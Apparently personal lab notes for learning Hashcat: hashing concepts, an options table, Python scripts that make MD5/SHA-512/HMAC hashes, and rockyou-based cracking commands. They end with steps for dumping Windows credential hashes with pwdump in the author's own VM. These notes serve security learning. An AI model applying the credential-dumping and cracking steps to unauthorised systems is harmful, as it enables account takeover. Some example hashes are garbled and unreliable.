# Hashcat for Dictionary Attack




## What is Password Hashing?
Hashing is the process of converting an alphanumeric string into a fixedsize string by using a hash function. A hash function is a mathematical function that takes in an input string and generates another alphanumeric string.

<img width="1024" height="492" alt="Hashing-Example-1024x492" src="https://github.com/user-attachments/assets/4b5ee6e5-00bb-4dc6-90e8-f5182ea3994a" />



## How hashing works
There are many hashing algorithms like MD5, SHA1, and so on.  The length of a hash is always a constant, irrespective of the length of the input. For example, if we use the MD5 algorithm and hash two strings like “Password123” and “HelloWorld1234”, the final hash will have a fixed length.

- Here is the MD5 hash for “Password123”
````
 42f749ade7f9e195bf475f37a44cafcb
````

-  If we use the input string as “HelloWorld1234”, this will be the result:
````
850eaebd5c4bb931dbb2bbcf7994c021
````







## What is Hashcat?
Hashcat is a fast password recovery tool that helps break complex password hashes. It is a flexible and feature-rich tool that offers many ways of finding passwords from hashes
Hashcat is also one of the few tools that can work with the GPU. While CPUs are great for sequential tasks, GPUs have powerful parallel processing capabilities. GPUs are used in Gaming, Artificial intelligence, and can also be used to speed up password cracking.
### Key Advantages:
  - GPU Accelerated - 100x faster than CPU tools
  - 300+ Hash Types supported
  - Cross-Platform - Windows, Linux, macOS
  - Multiple Attack Modes - Brute force, dictionary, rules, hybrid
  - Distributed Cracking - Multiple systems


### Analyzing the Hash
- **Hashing = Data Integrity**


###  What Is a One-Way Hash Function?
A one-way hash function takes input data (like a name, password, or file) and transforms it into a fixed-length string of characters—called a hash value or digest—in a way that:
  - Is deterministic: the same input always gives the same output.
  - Is irreversible: you can't go backward from the hash to the original input.
  - Is unique-ish: different inputs usually produce different hashes (though collisions can happen, they're rare in strong algorithms).


**h = Hx**:
- `h`: The hash value (also called digest or checksum)
- `H`: The hashing algorithm (e.g., SHA256, MD5, SHA1)
- `x`: The input data (e.g., "Gus")


````
62128be42907c0866965a87657982a8e0e6ee410aeab02af667a05696384ceb5 ➔ SHA256 of Gus
````
It means:
  - The input x is "Gus".
  - The algorithm H is SHA256.
  - The output h is the long hexadecimal string above.
  

### Hashing Requirements
| Requirement               | What It Means                                                                                     | Why It Matters                                                             |
| ------------------------- | ------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| **Any Input**             | You can hash anything—text, files, passwords, etc.                                                | Flexibility for diverse use cases (e.g., login systems, file integrity)    |
| **Output Fixed Length**   | No matter the input size, the hash is always the same length (e.g., SHA-256 = 64 hex characters). | Prevents leaking info about input size; simplifies storage and comparison. |
| **Easy to Compute**       | Hashing should be fast and efficient.                                                             | Enables real-time applications like password checks or file verification.  |
| **Output Not Reversible** | You can’t go backward from the hash to the original input.                                        | Critical for security—protects passwords and sensitive data.               |
| **Hₓ ≠ Hᵧ**               | Different inputs should produce different hashes.                                                 | Ensures uniqueness and prevents collisions (e.g., `"Gus"` ≠ `"gus"`).      |

````
Input: Gus
Algorithm: SHA256
Output: 62128be42907c0866965a87657982a8e0e6ee410aeab02af667a05696384ceb5
````
- Now hash "gus" (lowercase)—you’ll get a completely different hash. That’s the Hₓ ≠ Hᵧ principle in action.


### Hashing Algorithms
| Algorithm    | Type                               | Output                 | Use Case                                                    |
| ------------ | ---------------------------------- | ---------------------- | ----------------------------------------------------------- |
| **MD5**      | Message Digest                     | `5a4bcb095f3936badc27` | Legacy checksums, file integrity (not secure for passwords) |
| **SHA-224**  | Secure Hash Algorithm              | `4a0b5dddf98ca148ae7d` | Stronger than MD5, used in digital signatures               |
| **NTLM**     | Windows Authentication             | `56E915A4C76D126DF81`  | Windows login systems (legacy, vulnerable to cracking)      |
| **HMAC-MD5** | Keyed Hash (with key = "password") | `7f265boe6817b6c6d9c4` | Message authentication (used in APIs, secure channels)      |



### What Is MD5?
MD5 (Message Digest 5) is a hashing algorithm that:
  • Produces a 128-bit hash (or 32 hexadecimal characters)
  • Was designed for speed and simplicity
  • Is now considered cryptographically broken

**Why MD5 Is No Longer Safe
  • MD4, its predecessor, is obsolete.
  • MD5 is vulnerable to collisions—two different inputs can produce the same hash.
  • Attackers can reverse-engineer hashes using rainbow tables or brute-force tools like Hashcat.
  • NEVER use MD5 to store passwords or credentials—it’s too easy to crack.**


### To generate Hash
- Browser to generate Hash: https://www.browserling.com/tools/all-hashes



# Hashcat Methodology

## INSTALLATION & SETUP

### Installationhashcat
````
sudo apt install hashcat -y
````
<img width="1007" height="264" alt="image" src="https://github.com/user-attachments/assets/4e97d1bb-f62e-48cf-9a31-deaefd347031" />


### Verify installation
````
hashcat --version
````
<img width="364" height="107" alt="image" src="https://github.com/user-attachments/assets/821fc7da-513b-47f8-b0d4-c90c02979966" />



### Verify GPU Detection

#### Check available hardware
````
hashcat -I
````
<img width="1402" height="678" alt="image" src="https://github.com/user-attachments/assets/ba2b43bb-ddbf-474b-82e6-eb020df2d0d5" />


#### More details
````
hashcat -b -m 0
````
<img width="1807" height="662" alt="image" src="https://github.com/user-attachments/assets/964b7d0d-eb02-4fc5-bebf-506c3234ec0b" />

- `-b`: Runs a benchmark to test the speed of different hashing algorithms.
- `-m 0`: Specifies hash mode 0, which is MD5.
- **This command benchmarks Hashcat's performance cracking MD5 hashes.**

#### MD5 cracking using both CPU and GPU
````
hashcat -b -m 0 -D 1,2 --force
````

- `-D 1,2`:  Tells Hashcat to use device types 1 and 2:
  - `1`: CPU
  - `2`: GPU
- `--force`:  Forces Hashcat to run even if it detects potential issues (e.g., unsupported drivers or hardware).
- **This command benchmarks MD5 cracking using both CPU and GPU, overriding any warnings.**


---



## 2. HASHCAT BASIC SYNTAX

### Core Command Structure
````
hashcat -m [hash_type] -a [attack_mode] [hash_file] [wordlist] [options]
````

### Usage Options
| Option(s)                           | Type | Description                                            | Example                                |
| ----------------------------------- | ---: | ------------------------------------------------------ | -------------------------------------- |
| `-m`, `--hash-type`                 |  Num | Hash-type, references below (otherwise autodetect)     | `-m 1000`                              |
| `-a`, `--attack-mode`               |  Num | Attack-mode, see references below                      | `-a 3`                                 |
| `-V`, `--version`                   |    — | Print version                                          | `-V`                                   |
| `-h`, `--help`                      |    — | Print help. Use `-hh` to show all supported hash-modes | `-h` or `-hh`                          |
| `--quiet`                           |    — | Suppress output                                        | `--quiet`                              |
| `--hex-charset`                     |    — | Assume charset is given in hex                         | `--hex-charset`                        |
| `--hex-salt`                        |    — | Assume salt is given in hex                            | `--hex-salt`                           |
| `--hex-wordlist`                    |    — | Assume words in wordlist are given in hex              | `--hex-wordlist`                       |
| `--force`                           |    — | Ignore warnings                                        | `--force`                              |
| `--deprecated-check-disable`        |    — | Enable deprecated plugins                              | `--deprecated-check-disable`           |
| `--status`                          |    — | Enable automatic update of the status screen           | `--status`                             |
| `--status-json`                     |    — | Enable JSON format for status output                   | `--status-json`                        |
| `--status-timer`                    |  Num | Sets seconds between status screen updates to X        | `--status-timer=1`                     |
| `--stdin-timeout-abort`             |  Num | Abort if there is no input from stdin for X seconds    | `--stdin-timeout-abort=300`            |
| `--machine-readable`                |    — | Display the status view in a machine-readable format   | `--machine-readable`                   |
| `--keep-guessing`                   |    — | Keep guessing the hash after it has been cracked       | `--keep-guessing`                      |
| `--self-test-disable`               |    — | Disable self-test functionality on startup             | `--self-test-disable`                  |
| `--loopback`                        |    — | Add new plains to induction directory (loopback)       | `--loopback`                           |
| `--markov-hcstat2`                  | File | Specify hcstat2 file to use                            | `--markov-hcstat2=my.hcstat2`          |
| `--markov-disable`                  |    — | Disables markov-chains, emulates classic brute-force   | `--markov-disable`                     |
| `--markov-classic`                  |    — | Enables classic markov-chains, no per-position         | `--markov-classic`                     |
| `--markov-inverse`                  |    — | Enables inverse markov-chains, no per-position         | `--markov-inverse`                     |
| `-t`, `--markov-threshold`          |  Num | Threshold X when to stop accepting new markov-chains   | `-t 50`                                |
| `--metal-compiler-runtime`          |  Num | Abort Metal kernel build after X seconds of runtime    | `--metal-compiler-runtime=180`         |
| `--runtime`                         |  Num | Abort session after X seconds of runtime               | `--runtime=10`                         |
| `--session`                         |  Str | Define specific session name                           | `--session=mysession`                  |
| `--restore`                         |    — | Restore session from `--session`                       | `--restore`                            |
| `--restore-disable`                 |    — | Do not write restore file                              | `--restore-disable`                    |
| `--restore-file-path`               | File | Specific path to restore file                          | `--restore-file-path=x.restore`        |
| `-o`, `--outfile`                   | File | Define outfile for recovered hash                      | `-o outfile.txt`                       |
| `--outfile-format`                  |  Str | Outfile format to use, separated with commas           | `--outfile-format=1,3`                 |
| `--outfile-json`                    |    — | Force JSON format in outfile format                    | `--outfile-json`                       |
| `--outfile-autohex-disable`         |    — | Disable the use of `$HEX[]` in output plains           | `--outfile-autohex-disable`            |
| `--outfile-check-timer`             |  Num | Sets seconds between outfile checks to X               | `--outfile-check-timer=30`             |
| `--wordlist-autohex-disable`        |    — | Disable conversion of `$HEX[]` from the wordlist       | `--wordlist-autohex-disable`           |
| `-p`, `--separator`                 | Char | Separator char for hashlists and outfile               | `-p :`                                 |
| `--stdout`                          |    — | Do not crack a hash, instead print candidates only     | `--stdout`                             |
| `--show`                            |    — | Compare hashlist with potfile; show cracked hashes     | `--show`                               |
| `--left`                            |    — | Compare hashlist with potfile; show uncracked hashes   | `--left`                               |
| `--username`                        |    — | Enable ignoring of usernames in hashfile               | `--username`                           |
| `--dynamic-x`                       |    — | Ignore `$dynamic_X$` prefix in hashes                  | `--dynamic-x`                          |
| `--remove`                          |    — | Enable removal of hashes once they are cracked         | `--remove`                             |
| `--remove-timer`                    |  Num | Update input hash file each X seconds                  | `--remove-timer=30`                    |
| `--potfile-disable`                 |    — | Do not write potfile                                   | `--potfile-disable`                    |
| `--potfile-path`                    | File | Specific path to potfile                               | `--potfile-path=my.pot`                |
| `--encoding-from`                   | Code | Force internal wordlist encoding from X                | `--encoding-from=iso-8859-15`          |
| `--encoding-to`                     | Code | Force internal wordlist encoding to X                  | `--encoding-to=utf-32le`               |
| `--debug-mode`                      |  Num | Defines the debug mode (hybrid only by using rules)    | `--debug-mode=4`                       |
| `--debug-file`                      | File | Output file for debugging rules                        | `--debug-file=good.log`                |
| `--induction-dir`                   |  Dir | Specify the induction directory to use for loopback    | `--induction=inducts`                  |
| `--outfile-check-dir`               |  Dir | Specify directory to monitor 3rd party outfiles        | `--outfile-check-dir=x`                |
| `--logfile-disable`                 |    — | Disable the logfile                                    | `--logfile-disable`                    |
| `--hccapx-message-pair`             |  Num | Load only message pairs from hccapx matching X         | `--hccapx-message-pair=2`              |
| `--nonce-error-corrections`         |  Num | The BF size range to replace AP's nonce last bytes     | `--nonce-error-corrections=16`         |
| `--keyboard-layout-mapping`         | File | Keyboard layout mapping table for special hash-modes   | `--keyb=german.hckmap`                 |
| `--truecrypt-keyfiles`              | File | Keyfiles to use, separated with commas                 | `--truecrypt-keyf=x.png`               |
| `--veracrypt-keyfiles`              | File | Keyfiles to use, separated with commas                 | `--veracrypt-keyf=x.txt`               |
| `--veracrypt-pim-start`             |  Num | VeraCrypt personal iterations multiplier start         | `--veracrypt-pim-start=450`            |
| `--veracrypt-pim-stop`              |  Num | VeraCrypt personal iterations multiplier stop          | `--veracrypt-pim-stop=500`             |
| `-b`, `--benchmark`                 |    — | Run benchmark of selected hash-modes                   | `-b`                                   |
| `--benchmark-all`                   |    — | Run benchmark of all hash-modes (requires `-b`)        | `--benchmark-all`                      |
| `--benchmark-min`                   |    — | Set benchmark min hash-mode (requires `-b`)            | `--benchmark-min=100`                  |
| `--benchmark-max`                   |    — | Set benchmark max hash-mode (requires `-b`)            | `--benchmark-max=1000`                 |
| `--speed-only`                      |    — | Return expected speed of the attack, then quit         | `--speed-only`                         |
| `--progress-only`                   |    — | Return ideal progress step size and time to process    | `--progress-only`                      |
| `-c`, `--segment-size`              |  Num | Sets size in MB to cache from the wordfile to X        | `-c 32`                                |
| `--bitmap-min`                      |  Num | Sets minimum bits allowed for bitmaps to X             | `--bitmap-min=24`                      |
| `--bitmap-max`                      |  Num | Sets maximum bits allowed for bitmaps to X             | `--bitmap-max=24`                      |
| `--bridge-parameter1`               |  Str | Sets the generic parameter 1 for a Bridge              | `--bridge-parameter1=...`              |
| `--bridge-parameter2`               |  Str | Sets the generic parameter 2 for a Bridge              | `--bridge-parameter2=...`              |
| `--bridge-parameter3`               |  Str | Sets the generic parameter 3 for a Bridge              | `--bridge-parameter3=...`              |
| `--bridge-parameter4`               |  Str | Sets the generic parameter 4 for a Bridge              | `--bridge-parameter4=...`              |
| `--cpu-affinity`                    |  Str | Locks to CPU devices, separated with commas            | `--cpu-affinity=1,2,3`                 |
| `--hook-threads`                    |  Num | Sets number of threads for a hook (per compute unit)   | `--hook-threads=8`                     |
| `-H`, `--hash-info`                 |    — | Show information for each hash-mode                    | `-H` or `-HH`                          |
| `--example-hashes`                  |    — | Alias of `--hash-info`                                 | `--example-hashes`                     |
| `--backend-ignore-cuda`             |    — | Do not try to open CUDA interface on startup           | `--backend-ignore-cuda`                |
| `--backend-ignore-hip`              |    — | Do not try to open HIP interface on startup            | `--backend-ignore-hip`                 |
| `--backend-ignore-metal`            |    — | Do not try to open Metal interface on startup          | `--backend-ignore-metal`               |
| `--backend-ignore-opencl`           |    — | Do not try to open OpenCL interface on startup         | `--backend-ignore-opencl`              |
| `-I`, `--backend-info`              |    — | Show system/environment/backend API info               | `-I` or `-II`                          |
| `-d`, `--backend-devices`           |  Str | Backend devices to use, separated with commas          | `-d 1`                                 |
| `-Y`, `--backend-devices-virtmulti` |  Num | Spawn X virtual instances on a real device             | `-Y 8`                                 |
| `-R`, `--backend-devices-virthost`  |  Num | Sets the real device to create virtual instances       | `-R 1`                                 |
| `--backend-devices-keepfree`        |  Num | Keep specified percentage of device memory free        | `--backend-devices-keepfree=5`         |
| `-D`, `--opencl-device-types`       |  Str | OpenCL device-types to use, separated with commas      | `-D 1`                                 |
| `-O`, `--optimized-kernel-enable`   |    — | Enable optimized kernels (limits password length)      | `-O`                                   |
| `-M`, `--multiply-accel-disable`    |    — | Disable multiply kernel-accel with processor count     | `-M`                                   |
| `-w`, `--workload-profile`          |  Num | Enable a specific workload profile, see pool below     | `-w 3`                                 |
| `-n`, `--kernel-accel`              |  Num | Manual workload tuning, set outerloop step size to X   | `-n 64`                                |
| `-u`, `--kernel-loops`              |  Num | Manual workload tuning, set innerloop step size to X   | `-u 256`                               |
| `-T`, `--kernel-threads`            |  Num | Manual workload tuning, set thread count to X          | `-T 64`                                |
| `--backend-vector-width`            |  Num | Manually override backend vector-width to X            | `--backend-vector-width=4`             |
| `--spin-damp`                       |  Num | Use CPU for device synchronization, in percent         | `--spin-damp=10`                       |
| `--hwmon-disable`                   |    — | Disable temperature and fanspeed reads and triggers    | `--hwmon-disable`                      |
| `--hwmon-temp-abort`                |  Num | Abort if temperature reaches X degrees Celsius         | `--hwmon-temp-abort=100`               |
| `--scrypt-tmto`                     |  Num | Manually override TMTO value for scrypt to X           | `--scrypt-tmto=3`                      |
| `-s`, `--skip`                      |  Num | Skip X words from the start                            | `-s 1000000`                           |
| `-l`, `--limit`                     |  Num | Limit X words from the start + skipped words           | `-l 1000000`                           |
| `--keyspace`                        |    — | Show keyspace base:mod values and quit                 | `--keyspace`                           |
| `--total-candidates`                |    — | Show total candidate count (base*mod) and quit         | `--total-candidates`                   |
| `-j`, `--rule-left`                 | Rule | Single rule applied to each word from left wordlist    | `-j 'c'`                               |
| `-k`, `--rule-right`                | Rule | Single rule applied to each word from right wordlist   | `-k '^-''`                             |
| `-r`, `--rules-file`                | File | Multiple rules applied to each word from wordlists     | `-r rules/best64.rule`                 |
| `-g`, `--generate-rules`            |  Num | Generate X random rules                                | `-g 10000`                             |
| `--generate-rules-func-min`         |  Num | Force min X functions per rule                         | `--generate-rules-func-min=1`          |
| `--generate-rules-func-max`         |  Num | Force max X functions per rule                         | `--generate-rules-func-max=5`          |
| `--generate-rules-func-sel`         |  Str | Pool of rule operators valid for random rule engine    | `--generate-rules-func-sel=ioTlc`      |
| `--generate-rules-seed`             |  Num | Force RNG seed set to X                                | `--generate-rules-seed=42`             |
| `-1`, `--custom-charset1`           |   CS | User-defined charset `?1`                              | `-1 ?l?d?u`                            |
| `-2`, `--custom-charset2`           |   CS | User-defined charset `?2`                              | `-2 ?l?d?s`                            |
| `-3`, `--custom-charset3`           |   CS | User-defined charset `?3`                              | `-3 ?d`                                |
| `-4`, `--custom-charset4`           |   CS | User-defined charset `?4`                              | `-4 ?u`                                |
| `-5` ... `-8`                       |   CS | User-defined charsets `?5` ... `?8`                    | `-5 ?a`                                |
| `--identify`                        |    — | Shows all supported algorithms for input hashes        | `--identify my.hash`                   |
| `-i`, `--increment`                 |    — | Enable mask increment mode                             | `-i`                                   |
| `-ii`, `--increment-inverse`        |    — | Increment from right-to-left                           | `-ii`                                  |
| `--increment-min`                   |  Num | Start mask incrementing at X                           | `--increment-min=4`                    |
| `--increment-max`                   |  Num | Stop mask incrementing at X                            | `--increment-max=8`                    |
| `-S`, `--slow-candidates`           |    — | Enable slower (but advanced) candidate generators      | `-S`                                   |
| `--bypass-delay`                    |  Num | Seconds delay between checking bypass threshold        | `--bypass-delay=5`                     |
| `--bypass-threshold`                |  Num | Minimum amount of founds to avoid being bypassed       | `--bypass-threshold=5`                 |
| `--brain-server`                    |    — | Enable brain server                                    | `--brain-server`                       |
| `--brain-server-timer`              |  Num | Update the brain server dump each X seconds (min:60)   | `--brain-server-timer=300`             |
| `-z`, `--brain-client`              |    — | Enable brain client, activates `-S`                    | `-z`                                   |
| `--brain-client-features`           |  Num | Define brain client features, see below                | `--brain-client-features=3`            |
| `--brain-host`                      |  Str | Brain server host (IP or domain)                       | `--brain-host=127.0.0.1`               |
| `--brain-port`                      | Port | Brain server port                                      | `--brain-port=13743`                   |
| `--brain-password`                  |  Str | Brain server authentication password                   | `--brain-password=bZfhCvGUSjRq`        |
| `--brain-session`                   |  Hex | Overrides automatically calculated brain session       | `--brain-session=0x2ae611db`           |
| `--brain-session-whitelist`         |  Hex | Allow given sessions only, separated with commas       | `--brain-session-whitelist=0x2ae611db` |
| `--color-cracked`                   |    — | Enables color output for cracked hashes                | `--color-cracked`                      |






### View All Supported Hashes

#### List all hash types
````
hashcat --help | grep -E "^ *[0-9]+\s"
````
<img width="813" height="717" alt="image" src="https://github.com/user-attachments/assets/ac21613a-294c-4fb7-8559-0b596cd3723c" />



#### Common hash types
````
hashcat --help | grep -E "(MD5|SHA1|SHA256|NTLM|bcrypt)"
````
<img width="1174" height="139" alt="image" src="https://github.com/user-attachments/assets/9803ffc5-d4cc-424f-86de-a475eb6ac37f" />

---




## Hashing Algorithms

### What Is MD5?
MD5 (Message Digest 5) is a hashing algorithm that:
  • Produces a 128-bit hash (or 32 hexadecimal characters)
  • Was designed for speed and simplicity
  • Is now considered cryptographically broken

**Why MD5 Is No Longer Safe
  • MD4, its predecessor, is obsolete.
  • MD5 is vulnerable to collisions—two different inputs can produce the same hash.
  • Attackers can reverse-engineer hashes using rainbow tables or brute-force tools like Hashcat.
  • NEVER use MD5 to store passwords or credentials—it’s too easy to crack.**


  
#### Generate Hash
- Go to `Browserling`: https://www.browserling.com/tools/all-hashes

#### Script
````
python3 -m venv venv
source venv/bin/activate
````
<img width="415" height="155" alt="image" src="https://github.com/user-attachments/assets/fbe6f32b-c1cd-41ca-8afa-c0d7c207249f" />

````
pip install pycryptodome
````
<img width="1008" height="151" alt="image" src="https://github.com/user-attachments/assets/d85470ab-d88e-4d82-81f6-ce74471df400" />



````
sudo mousepad md5.py
````
````
from Crypto.Hash import MD5
message="Gus"
h=MD5.new()
h.update(message.encode())
print (h.hexdigest())
````
<img width="643" height="474" alt="image" src="https://github.com/user-attachments/assets/c04ddcc0-f034-4042-9f68-06e098fdedd6" />


````
python3 md5.py
````
<img width="304" height="70" alt="image" src="https://github.com/user-attachments/assets/ac6b7e97-6f4e-4324-be71-6cd53c63056a" />

- In this we got the Hash: `5a4bcb095f3936badc27e5d580dedd86`


#### Crack Hash
````
echo "5a4bcb095f3936badc27e5d580dedd86" > md5_hash.txt
cat md5_hash.txt
````
<img width="563" height="126" alt="image" src="https://github.com/user-attachments/assets/d31e77a3-f9a5-4ec5-bbb9-29f9542ce8b6" />


````
hashcat -m 0 -a 0 md5_hash.txt /usr/share/wordlists/rockyou.txt
````
<img width="1234" height="546" alt="image" src="https://github.com/user-attachments/assets/5b4beec5-d06d-4fa4-bbdd-475b4bff28df" />

<img width="654" height="653" alt="image" src="https://github.com/user-attachments/assets/4694b57a-2e24-406a-9a21-305e8cc04bae" />

- `-m 0`: Specifies the hash type (MD5).
- `-a 0`: Specifies the attack mode (0 = Straight/Wordlist).
- `md5_hash.txt`: The file containing your target hash.
- `/usr/share/wordlists/rockyou.txt`: The path to your wordlist file (make sure it's decompressed if necessary).


---



### Secure Hash Algorithms (SHA)

####  What Is SHA-512?
SHA-512 is part of the SHA-2 family of cryptographic hash functions. It produces a 512-bit hash, which is:
  • Represented as 128 hexadecimal characters
  • Extremely secure and resistant to collisions
  • Used in digital certificates, blockchain, password hashing, and more

````
Input: Gus
SHA-512 Output: c6f950c2b5eea6509c29b6a9ad9184c9b652dgf09cb4c4a1a8442ac220ea10f5...
````


#### Why SHA-512 Is Strong
  - Longer output = harder to brute-force
  - No known practical collisions
  - Widely supported in tools like openssl, hashlib, and Hashcat
  - Ideal for high-security applications (e.g., banking, government, secure APIs)


#### SHA Versions Overview
1. SHA Version 0
  - This is the original, now obsolete version of SHA.
  - It was quickly replaced due to discovered vulnerabilities.
  - Not used in modern applications.

2. SHA Version 1
  - SHA-1 is the primary algorithm in this version.
  - Produces a 160-bit (20-byte) hash value, typically represented as a 40-character hexadecimal string.

 3. SHA Version 2
  - This is the current standard and includes several variants based on output size:

  ➤ SHA-224
    - Output: 224 bits (28 bytes)
    - Used when a shorter hash is needed but still secure.
  ➤ SHA-256
    - Output: 256 bits (32 bytes)
    - Most widely used variant today.
  ➤ SHA-384
    - Output: 384 bits (48 bytes)
    - Designed for higher security requirements.
  ➤ SHA-512
    - Output: 512 bits (64 bytes)
    - Highest security level in SHA-2.
    - Commonly used in Unix/Linux systems for password hashing ($6$ prefix).

4. SHA Version 3
Introduced by NIST in 2015 as a completely new design, not an evolution of SHA-2.
  ➤ SHA3-224, SHA3-256, SHA3-384, SHA3-512
    - Same output sizes as their SHA-2 counterparts.
    - Based on the Keccak algorithm, which won the NIST hash function competition.
    - Different internal structure from SHA-2, providing an alternative in case SHA-2 is compromised.
    - Not necessarily "stronger" than SHA-2, but offers diversity in cryptographic design.


#### Generate SHA
````
sudo mousepad sha512.py
````
````
from Crypto.Hash import SHA512
message="Gus"
h=SHA512.new()
h.update(message.encode())
print(h.hexdigest())
````
<img width="664" height="418" alt="image" src="https://github.com/user-attachments/assets/7b9b6635-8516-42ee-870d-adfed45da577" />


````
python3 sha512.py
````

<img width="1052" height="68" alt="image" src="https://github.com/user-attachments/assets/0cb0c33c-0da6-4282-9994-59a35a0c7cce" />

- In this we get Hash: `c6f950c2b5eea6509c29b6a9ad9184c9b652d9f09cb4c4a1a8442ac220ea10f5edcf68fea19fd893217b8c53f7146a21f00c3095bac9f10820b70b666db14764`




---


### Hash-based Message Authentication Code (HMAC)
#### What is HMAC?
HMAC = Integrity + Authenticity
  - Integrity: Ensures the message hasn't been altered during transmission. 
  - Authenticity: Verifies that the message comes from a legitimate source (the sender who knows the secret key).

#### How HMAC Works
- Basic format
````
HMAC = Hash(Key + Message)
````
But it's actually more complex internally to prevent attacks — it uses two passes of hashing with the key padded in specific ways.

#### HMAC with MD5
````
HMAC: MD5 + Password
````
 - Uses the MD5 hash function.
 - Key: password123
 - Message: Gus
 - Output: cd2442b6ccd1cdbboe575511dd41a201
Security Note: MD5 is cryptographically broken and should not be used for security-critical applications. It’s vulnerable to collision attacks. 

#### HMAC with SHA1
````
HMAC: SHA1 + Password
````
 - Uses the SHA1 hash function.
 - More secure than MD5, but also deprecated due to discovered vulnerabilities.
 - Still better than MD5, but avoid for new systems.


#### Generate HMAC
````
sudo mousepad hmac.py
````
````
from Crypto.Hash import HMAC
secret_key=str("password123")
message=str("This is a message")
h=HMAC.new(secret_key.encode(),message.encode())
print(h.hexdigest())
````
<img width="655" height="376" alt="image" src="https://github.com/user-attachments/assets/ce10f474-84fa-4471-ba28-ff90d15f484b" />


````
python3 hmac.py
````
<img width="300" height="70" alt="image" src="https://github.com/user-attachments/assets/9e3c7946-c98d-46eb-81e5-042f8c1ab8c6" />

- In this we get Hash of HMAC: `e3dacbaa503d4324ccc9dd0cb7f4faa5`



#### Crack Hash:
- First in this i need to create file of hmac Hash:
````
nano hmac_hash.txt
````
````
This is a message:e3dacbaa503d4324ccc9dd0cb7f4faa5
````
<img width="318" height="71" alt="image" src="https://github.com/user-attachments/assets/957c1033-afa2-4808-99db-bfc3f103e21e" />


````
hashcat -m 5100 hmac_hash.txt /usr/share/wordlists/rockyou.txt
````


---





### NTLM History
#### LM (LAN Manager) Hash
  - Used Prior to: Windows Vista & Windows Server 2008
  - Description:
    - An older, weaker hash format introduced in early Windows systems.
    - Converts passwords to uppercase before hashing.
    - Limits passwords to 14 characters.
    - Splits the password into two 7-character halves and hashes each separately — making it extremely vulnerable to brute-force attacks.
  - Security Status: Insecure and deprecated. Modern Windows systems disable LM by default for security reasons.

#### NTLM (NT LAN Manager) V2
  - Used In: Modern Windows OS (Windows Vista and later)
  - Description:
    - Replaced LM as the default authentication protocol.
    - Uses MD4 for hashing the Unicode password (no case conversion).
    - Supports longer passwords and is more resistant to brute force than LM.
    - NTLMv2 adds challenge-response authentication and uses HMAC-MD5 with a client-generated nonce, making it significantly more secure than LM or even NTLMv1.
  - Security Status: Still used today, but considered legacy. Microsoft recommends migrating to Kerberos for domain environments.  
| **Feature**        | **LM HASH**              |      **LTLMV2 HASH**          |
| ------------------ | ------------------------ | ----------------------------- |
| **Password Case**  | Uppercase only           | Case-sensitive                |
| **Max Length**     | 14 characters            | Unlimited                     |
| **Hash Algorithm** | DES (weak)               | MD4 (NT hash) + HMAC-MD5 (v2) |
| **Salt?**          | No                       | Yes (in v2)                   |
| **Security**       | ❌ Very Weak              | ✅ Moderate (but legacy)       |

<img width="915" height="434" alt="image" src="https://github.com/user-attachments/assets/41ad9d53-da33-4aad-a949-626f42574dc1" />


- In this i go to my `Windows 10` in my VMware:
<img width="1038" height="903" alt="image" src="https://github.com/user-attachments/assets/66e2d097-737f-4bbf-904f-df1f8849047e" />

- After i go to in my window Press `Ctrl + X`:
<img width="463" height="905" alt="image" src="https://github.com/user-attachments/assets/65748926-5642-4b3e-9762-775772a688d5" />

<img width="455" height="312" alt="image" src="https://github.com/user-attachments/assets/2241db90-baf4-4dd8-9bf9-4e933c91c0a8" />

- Interminal:
````
cd C:\Windows\System32\config
ls
````
<img width="612" height="441" alt="image" src="https://github.com/user-attachments/assets/5417812a-02dc-4fe3-b996-b7888b0aca6a" />


- Go to this website: https://www.openwall.com/passwords/windows-pwdump
<img width="1893" height="817" alt="image" src="https://github.com/user-attachments/assets/d16208a3-c9a7-4a4f-a0b0-c8d7ee494c40" />

<img width="1918" height="621" alt="image" src="https://github.com/user-attachments/assets/2b926882-b7a4-4805-8321-b527cd8c4d46" />

- In this we see it clocked our file, after click on `keep`
<img width="550" height="382" alt="image" src="https://github.com/user-attachments/assets/e2410637-6dbd-41df-9c4b-49f9f0d3032a" />

<img width="500" height="617" alt="image" src="https://github.com/user-attachments/assets/c5ee4634-59d0-461a-8dbc-3b2cbe513f71" />

<img width="418" height="572" alt="image" src="https://github.com/user-attachments/assets/f5446986-0d14-47ab-9f07-7c823d9e0301" />

<img width="731" height="380" alt="image" src="https://github.com/user-attachments/assets/11ecfa37-2abc-4f83-ac3b-d04c83887c73" />

- We got a file.

- After downloads it, open anothers terminal:
<img width="838" height="470" alt="image" src="https://github.com/user-attachments/assets/665ef2fe-54d8-48a9-acf5-650e0e1b6f20" />

- List the existing user profiles:
````
Get-ChildItem -Path C:\Users
````
<img width="527" height="179" alt="image" src="https://github.com/user-attachments/assets/e0f322bb-363a-4406-a934-8011be8851a2" />

- Use users
````
cd C:\Users\mepol
````
<img width="370" height="85" alt="image" src="https://github.com/user-attachments/assets/787473d3-e6e9-4e6a-a957-b4720b4337e9" />


- Navigate to the Downloads Folder
````
cd C:\Users\mepol\Downloads
````
<img width="423" height="128" alt="image" src="https://github.com/user-attachments/assets/3827f430-8cad-47be-b67b-08224b8a25e9" />

- Check if the File Exists
````
ls
````
or
````
dir
````
<img width="702" height="312" alt="image" src="https://github.com/user-attachments/assets/234bf2dd-f6f2-4560-be02-d9594ef8bfd8" />


- Extract the ZIP file: PowerShell has a built-in cmdlet for this:
````
Expand-Archive -Path "pwdump1 (1).zip" -DestinationPath ".\pwdump_extracted"
````
<img width="799" height="84" alt="image" src="https://github.com/user-attachments/assets/e769abf6-84f4-4dc5-a02a-05694b637bd7" />

- Navigate into the extracted folder
````
cd .\pwdump_extracted
ls
````
<img width="460" height="198" alt="image" src="https://github.com/user-attachments/assets/7ec96f7f-e71a-4668-8e2b-61dca8318973" />


- Go to pwdump
````
cd .\pwdump
ls
````
<img width="602" height="262" alt="image" src="https://github.com/user-attachments/assets/0e55b604-d8ea-4051-9ed7-bd83beccc2b1" />


- Execute file
````
.\pwdump.exe
````
- In this it will success, but in my machine not success.



- Now i try to downloads `pwdump8`:
<img width="1030" height="827" alt="image" src="https://github.com/user-attachments/assets/a8fe577c-8dab-4e42-8aaa-5d2cb77fc2ea" />

<img width="498" height="336" alt="image" src="https://github.com/user-attachments/assets/bc82e814-828d-4319-a0ee-57fb810797e9" />

- Now i'm finished downloads. And after open our `PowerShell`:
````
Get-ChildItem -Path C:\Users
cd C:\Users\mepol
cd C:\Users\mepol\Downloads
ls
````
